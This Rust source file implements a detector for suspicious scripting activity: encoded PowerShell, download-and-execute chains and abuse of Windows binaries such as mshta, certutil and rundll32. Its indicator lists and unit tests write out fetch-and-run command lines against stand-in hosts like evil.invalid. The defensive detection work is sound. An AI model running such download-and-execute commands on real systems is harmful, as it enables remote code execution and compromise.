use crate::detector::{
    DetectionFinding, DetectionStrategy, ProcessStartEvent, TelemetryEvent, TelemetryPayload,
};
use crate::{ProfileValidationError, validate_confidence_thresholds};
use serde::{Deserialize, Serialize};
use serde_json::json;
use swarm_core::pheromone::ThreatClass;
use swarm_core::types::Severity;

#[derive(Debug, Clone, PartialEq, Serialize, Deserialize)]
#[serde(deny_unknown_fields)]
pub struct SuspiciousScriptingProfile {
    #[serde(default = "default_encoded_indicators")]
    pub encoded_indicators: Vec<String>,
    #[serde(default = "default_download_execute_indicators")]
    pub download_execute_indicators: Vec<String>,
    #[serde(default = "default_lolbin_processes")]
    pub lolbin_processes: Vec<String>,
    #[serde(default = "default_high_confidence_threshold")]
    pub high_confidence_threshold: f64,
    #[serde(default = "default_medium_confidence_threshold")]
    pub medium_confidence_threshold: f64,
}

impl Default for SuspiciousScriptingProfile {
    fn default() -> Self {
        Self {
            encoded_indicators: default_encoded_indicators(),
            download_execute_indicators: default_download_execute_indicators(),
            lolbin_processes: default_lolbin_processes(),
            high_confidence_threshold: default_high_confidence_threshold(),
            medium_confidence_threshold: default_medium_confidence_threshold(),
        }
    }
}

#[derive(Debug, Clone)]
pub struct SuspiciousScriptingDetector {
    encoded_indicators: Vec<String>,
    download_execute_indicators: Vec<String>,
    lolbin_processes: Vec<String>,
    high_confidence_threshold: f64,
    medium_confidence_threshold: f64,
}

impl Default for SuspiciousScriptingDetector {
    fn default() -> Self {
        Self {
            encoded_indicators: default_encoded_indicators()
                .into_iter()
                .map(|value| value.to_ascii_lowercase())
                .collect(),
            download_execute_indicators: default_download_execute_indicators()
                .into_iter()
                .map(|value| value.to_ascii_lowercase())
                .collect(),
            lolbin_processes: default_lolbin_processes()
                .into_iter()
                .map(|value| value.to_ascii_lowercase())
                .collect(),
            high_confidence_threshold: default_high_confidence_threshold(),
            medium_confidence_threshold: default_medium_confidence_threshold(),
        }
    }
}

impl SuspiciousScriptingDetector {
    pub fn from_profile(
        profile: SuspiciousScriptingProfile,
    ) -> Result<Self, ProfileValidationError> {
        profile.validate()?;
        Ok(Self {
            encoded_indicators: profile
                .encoded_indicators
                .into_iter()
                .map(|value| value.to_ascii_lowercase())
                .collect(),
            download_execute_indicators: profile
                .download_execute_indicators
                .into_iter()
                .map(|value| value.to_ascii_lowercase())
                .collect(),
            lolbin_processes: profile
                .lolbin_processes
                .into_iter()
                .map(|value| value.to_ascii_lowercase())
                .collect(),
            high_confidence_threshold: profile.high_confidence_threshold,
            medium_confidence_threshold: profile.medium_confidence_threshold,
        })
    }

    pub fn profile(&self) -> SuspiciousScriptingProfile {
        SuspiciousScriptingProfile {
            encoded_indicators: self.encoded_indicators.clone(),
            download_execute_indicators: self.download_execute_indicators.clone(),
            lolbin_processes: self.lolbin_processes.clone(),
            high_confidence_threshold: self.high_confidence_threshold,
            medium_confidence_threshold: self.medium_confidence_threshold,
        }
    }

    fn evaluate_process(
        &self,
        event: &TelemetryEvent,
        process: &ProcessStartEvent,
    ) -> Option<DetectionFinding> {
        let process_name = process.process_name.to_ascii_lowercase();
        let command_line = process.command_line.to_ascii_lowercase();
        let is_powershell = process_name.contains("powershell") || process_name.contains("pwsh");
        let encoded = is_powershell
            && self
                .encoded_indicators
                .iter()
                .any(|indicator| command_line.contains(indicator));
        let download_execute = self
            .download_execute_indicators
            .iter()
            .any(|indicator| command_line.contains(indicator))
            && (command_line.contains("iex")
                || command_line.contains("invoke-expression")
                || command_line.contains("start-process")
                || command_line.contains("cmd /c"));
        let matched_lolbin = self
            .lolbin_processes
            .iter()
            .find(|lolbin| process_name.contains(lolbin.as_str()))
            .cloned();
        let lolbin_abuse = matched_lolbin
            .as_deref()
            .is_some_and(|lolbin| is_lolbin_abuse(lolbin, &command_line));

        if !encoded && !download_execute && !lolbin_abuse {
            return None;
        }

        let confidence = if encoded || download_execute || lolbin_abuse {
            self.high_confidence_threshold
        } else {
            self.medium_confidence_threshold
        };
        let severity = if encoded || download_execute {
            Severity::Critical
        } else {
            Severity::High
        };

        Some(DetectionFinding {
            finding_id: format!("{}:{}", self.id(), event.event_id),
            event_id: event.event_id.clone(),
            threat_class: ThreatClass::Execution,
            severity,
            confidence,
            evidence: json!({
                "parent_process": process.parent_process,
                "process_name": process.process_name,
                "command_line": process.command_line,
                "user": process.user,
                "host_id": event.host_id,
                "heuristics": {
                    "encoded": encoded,
                    "download_execute": download_execute,
                    "lolbin_abuse": lolbin_abuse,
                    "matched_lolbin": matched_lolbin,
                }
            }),
            strategy_id: self.id().to_string(),
        })
    }
}

impl SuspiciousScriptingProfile {
    pub fn validate(&self) -> Result<(), ProfileValidationError> {
        validate_confidence_thresholds(
            "SuspiciousScriptingProfile",
            self.high_confidence_threshold,
            self.medium_confidence_threshold,
        )
    }
}

impl DetectionStrategy for SuspiciousScriptingDetector {
    fn as_any(&self) -> &dyn std::any::Any {
        self
    }

    fn id(&self) -> &str {
        "suspicious_scripting"
    }

    fn evaluate(&self, event: &TelemetryEvent) -> Vec<DetectionFinding> {
        match &event.payload {
            TelemetryPayload::ProcessStart(process) => {
                self.evaluate_process(event, process).into_iter().collect()
            }
            TelemetryPayload::NetworkConnect(_)
            | TelemetryPayload::ProcessMemoryAccess(_)
            | TelemetryPayload::DnsQuery(_)
            | TelemetryPayload::RegistryAccess(_)
            | TelemetryPayload::RegistryPersistence(_)
            | TelemetryPayload::FilePersistence(_)
            | TelemetryPayload::AuthenticationEvent(_)
            | TelemetryPayload::InfrastructureHealth(_)
            | TelemetryPayload::ThermalAnomaly(_)
            | TelemetryPayload::ResourceExhaustion(_) => Vec::new(),
        }
    }
}

fn is_lolbin_abuse(lolbin: &str, command_line: &str) -> bool {
    match lolbin {
        "mshta" => command_line.contains("http://") || command_line.contains("https://"),
        "certutil" => {
            (command_line.contains("-urlcache") || command_line.contains("-verifyctl"))
                && (command_line.contains("http://") || command_line.contains("https://"))
        }
        "regsvr32" => command_line.contains("/i:http") || command_line.contains("/i:https"),
        "rundll32" => {
            command_line.contains("javascript:")
                || command_line.contains("http://")
                || command_line.contains("https://")
        }
        "cmstp" => command_line.contains("/s") && command_line.contains(".inf"),
        "wscript" | "cscript" => {
            (command_line.contains("http://") || command_line.contains("https://"))
                || command_line.contains(".js")
                || command_line.contains(".vbs")
        }
        _ => false,
    }
}

fn default_encoded_indicators() -> Vec<String> {
    ["-enc", "-encodedcommand", "frombase64string", "base64"]
        .into_iter()
        .map(str::to_string)
        .collect()
}

fn default_download_execute_indicators() -> Vec<String> {
    [
        "downloadstring",
        "downloadfile",
        "new-object net.webclient",
        "invoke-webrequest",
        "iwr ",
    ]
    .into_iter()
    .map(str::to_string)
    .collect()
}

fn default_lolbin_processes() -> Vec<String> {
    [
        "mshta", "certutil", "regsvr32", "rundll32", "cmstp", "wscript", "cscript",
    ]
    .into_iter()
    .map(str::to_string)
    .collect()
}

fn default_high_confidence_threshold() -> f64 {
    0.9
}

fn default_medium_confidence_threshold() -> f64 {
    0.7
}

#[cfg(test)]
#[allow(clippy::unwrap_used, clippy::expect_used)]
mod tests {
    use super::{SuspiciousScriptingDetector, SuspiciousScriptingProfile};
    use crate::detector::{DetectionStrategy, ProcessStartEvent, TelemetryEvent, TelemetryPayload};
    use swarm_core::pheromone::ThreatClass;
    use swarm_core::types::Severity;

    fn process_event(process_name: &str, command_line: &str) -> TelemetryEvent {
        TelemetryEvent {
            source: "synthetic".to_string(),
            event_id: "evt-script".to_string(),
            timestamp: 1_700_000_000,
            host_id: Some("host-script".to_string()),
            payload: TelemetryPayload::ProcessStart(ProcessStartEvent {
                parent_process: "winword".to_string(),
                process_name: process_name.to_string(),
                command_line: command_line.to_string(),
                user: Some("alice".to_string()),
                executable_path: None,
                signer: None,
                signature_valid: None,
            }),
        }
    }

    #[test]
    fn encoded_powershell_produces_execution_finding() {
        let detector = SuspiciousScriptingDetector::default();
        let findings = detector.evaluate(&process_event("powershell", "powershell.exe -enc AAAA"));

        assert_eq!(findings.len(), 1);
        assert_eq!(findings[0].threat_class, ThreatClass::Execution);
        assert_eq!(findings[0].severity, Severity::Critical);
    }

    #[test]
    fn download_and_execute_chain_produces_execution_finding() {
        let detector = SuspiciousScriptingDetector::default();
        let findings = detector.evaluate(&process_event(
            "powershell",
            "powershell IEX(New-Object Net.WebClient).DownloadString('https://example.invalid/payload')",
        ));

        assert_eq!(findings.len(), 1);
        assert_eq!(findings[0].threat_class, ThreatClass::Execution);
    }

    #[test]
    fn mshta_remote_script_produces_execution_finding() {
        let detector = SuspiciousScriptingDetector::default();
        let findings = detector.evaluate(&process_event(
            "mshta",
            "mshta.exe https://evil.invalid/payload.hta",
        ));

        assert_eq!(findings.len(), 1);
        assert_eq!(findings[0].severity, Severity::High);
    }

    #[test]
    fn rundll32_remote_script_produces_execution_finding() {
        let detector = SuspiciousScriptingDetector::default();
        let findings = detector.evaluate(&process_event(
            "rundll32",
            "rundll32.exe javascript:https://evil.invalid/payload.sct",
        ));
        assert_eq!(findings.len(), 1);
    }

    #[test]
    fn cmstp_inf_abuse_produces_execution_finding() {
        let detector = SuspiciousScriptingDetector::default();
        let findings = detector.evaluate(&process_event(
            "cmstp",
            "cmstp.exe /s C:\\Temp\\payload.inf",
        ));
        assert_eq!(findings.len(), 1);
    }

    #[test]
    fn cscript_remote_script_produces_execution_finding() {
        let detector = SuspiciousScriptingDetector::default();
        let findings = detector.evaluate(&process_event(
            "cscript",
            "cscript.exe https://evil.invalid/launch.js",
        ));
        assert_eq!(findings.len(), 1);
    }

    #[test]
    fn normal_powershell_does_not_trigger() {
        let detector = SuspiciousScriptingDetector::default();
        let findings =
            detector.evaluate(&process_event("powershell", "powershell.exe Get-Process"));
        assert!(findings.is_empty());
    }

    #[test]
    fn normal_certutil_does_not_trigger() {
        let detector = SuspiciousScriptingDetector::default();
        let findings = detector.evaluate(&process_event(
            "certutil",
            "certutil.exe -dump localcert.cer",
        ));
        assert!(findings.is_empty());
    }

    #[test]
    fn profile_round_trips() {
        let profile = SuspiciousScriptingProfile::default();
        let detector = SuspiciousScriptingDetector::from_profile(profile.clone())
            .expect("profile should be valid");
        assert_eq!(detector.profile(), profile);
    }
}
